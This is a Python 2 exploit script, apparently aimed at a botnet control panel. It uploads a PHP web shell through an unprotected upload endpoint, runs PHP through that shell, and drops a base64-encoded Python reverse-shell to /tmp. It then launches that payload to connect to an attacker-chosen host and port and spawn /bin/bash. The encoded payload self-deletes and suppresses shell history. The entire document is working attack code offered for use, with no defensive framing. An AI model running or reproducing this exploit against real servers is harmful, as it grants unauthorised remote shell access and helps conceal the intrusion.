#!/usr/bin/python2
# coding: utf-8
import requests
import sys
clear = "\x1b[0m"
blue = "\x1b[1;34m"
cyan = "\x1b[1;36m"
red = "\x1b[1;31m"
green = "\x1b[1;32m"

def upload_shell(base_url):
    files={'upload1':('file.log.php', "<?php @assert(filter_input(0,woot,516)); ?>")}
    data={'slots': '1'}
    url = base_url + "/post.php"
    sys.stdout.write(cyan+"{*} Attempting shell upload..."+clear)
    sys.stdout.flush()
    try:
        requests.post(url=url, files=files, data=data)
    except Exception, e:
        sys.stdout.write(red+" [failed]\n"+clear)
        sys.stdout.flush()
        sys.exit("Stack Trace: \n%s" %(str(e)))
    try:
        output = execute_php(base_url=base_url, php="print md5('pwned');")
    except Exception, e:
        sys.stdout.write(red+" [failed]\n"+clear)
        sys.stdout.flush()
        sys.exit("Stack Trace: \n%s" %(str(e)))
    if "5e93de3efa544e85dcd6311732d28f95" in output:
        sys.stdout.write(green+" [success]\n"+clear)

def upload_backconnect(base_url):
    sys.stdout.write(cyan+"{*} Uploading Backconnect..."+clear)
    encoded_shell = "IyEvdXNyL2Jpbi9weXRob24yCiMgY29kaW5nOiB1dGYtOAojIFNlbGYgRGVzdHJ1Y3RpbmcsIERhZW1vbmluZyBSZXZlcnNlIFBUWS4KIyBybSdzIHNlbGYgb24gcXVpdCA6MwojIFRPRE86CiMgMTogQWRkIGNyeXB0bwojIDI6IEFkZCBwcm9jbmFtZSBzcG9vZgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcHR5CmltcG9ydCBzb2NrZXQKaW1wb3J0IGNvbW1hbmRzCgpzaGVsbG1zZyA9ICJceDFiWzBtXHgxYlsxOzM2bUdvdCByb290IHlldD9ceDFiWzBtXHJcbiIgIyBuZWVkeiBhc2NpaQoKZGVmIHF1aXR0ZXIobXNnKToKICAgIHByaW50IG1zZwogICAgb3MudW5saW5rKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpICMgdW5jb21tZW50IGZvciBnb2dvc2VsZmRlc3RydWN0CiAgICBzeXMuZXhpdCgwKQoKZGVmIHJldmVyc2UoY2Job3N0LCBjYnBvcnQpOgogICAgdHJ5OgogICAgICAgIHVuYW1lID0gY29tbWFuZHMuZ2V0b3V0cHV0KCJ1bmFtZSAtYSIpCiAgICAgICAgaWQgPSBjb21tYW5kcy5nZXRvdXRwdXQoImlkIikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcXVpdHRlcignZ3JhYiB1bmFtZS9pZCBmYWlsJykKICAgIHRyeToKICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHNvY2suY29ubmVjdCgoY2Job3N0LCBpbnQoY2Jwb3J0KSkpCiAgICBleGNlcHQ6CiAgICAgICAgcXVpdHRlcignYWJvcnQ6IGNvbm5lY3Rpb24gZmFpbCcpCiAgICB0cnk6CiAgICAgICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIoc29jay5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHNvY2suZmlsZW5vKCksIDIpCiAgICBleGNlcHQ6CiAgICAgICAgcXVpdHRlcignYWJvcnQ6IGR1cDIgZmFpbCcpCiAgICB0cnk6CiAgICAgICAgb3MucHV0ZW52KCJISVNURklMRSIsICIvZGV2L251bGwiKQogICAgICAgIG9zLnB1dGVudigiUEFUSCIsICcvdXNyL2xvY2FsL3NiaW46L3Vzci9zYmluOi9zYmluOi9iaW46L3Vzci9sb2NhbC9iaW46L3Vzci9iaW4nKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdhYm9ydDogcHV0ZW52IGZhaWwnKQogICAgdHJ5OgogICAgICAgIHNvY2suc2VuZChzaGVsbG1zZykKICAgICAgICBzb2NrLnNlbmQoJ1x4MWJbMTszMm0nK3VuYW1lKyJcclxuIitpZCsiXHgxYlswbVxyXG4iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdzZW5kIGlkL3VuYW1lIGZ1Y2t1cCcpCiAgICB0cnk6CiAgICAgICAgcHR5LnNwYXduKCcvYmluL2Jhc2gnKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBxdWl0dGVyKCdhYm9ydDogcHR5IHNwYXduIGZhaWwnKQogICAgcXVpdHRlcigncXVpdHRpbmcsIGNsZWFudXAnKQoKZGVmIG1haW4oYXJncyk6CiAgICBpZiBvcy5mb3JrKCkgPiAwOiAKICAgICAgICBvcy5fZXhpdCgwKQogICAgcmV2ZXJzZShzeXMuYXJndlsxXSwgc3lzLmFyZ3ZbMl0pCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbihzeXMuYXJndikK"
    cbdrop = """$hack = "%s";$x = fopen("/tmp/x", "w+");fwrite($x, base64_decode($hack));fclose($x);echo "dongs";""" %(encoded_shell)
    lol = execute_php(base_url, php=php_encoder(cbdrop))
    if "dongs" in lol:
        sys.stdout.write(green+" [done]\n"+clear)

def execute_php(base_url, php):
    shell_url = base_url + "/logs/dump/file.log.php"
    data={'woot': php}
    r = requests.post(url=shell_url, data=data)
    return r.text

def php_encoder(php):
    encoded = php.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code
    
def pop_reverse(base_url, cb_host, cb_port):
    upload_shell(base_url)
    upload_backconnect(base_url)
    print "%s{*} Sending backconnect to %s%s:%s%s" %(cyan, green, cb_host, cb_port, clear)
    execute_php(base_url, php="system('python /tmp/x %s %s');" %(cb_host, cb_port))
    print "%s{$} bl1ngbl1ng!!%s" %(blue, clear)
    
def main(args):
    if len(args) != 4:
        sys.exit("use: %s http://bot.net/Panel hacke.rs 31337" %(args[0]))
    pop_reverse(base_url=args[1], cb_host=args[2], cb_port=args[3])
    
if __name__ == "__main__":
    main(args=sys.argv)
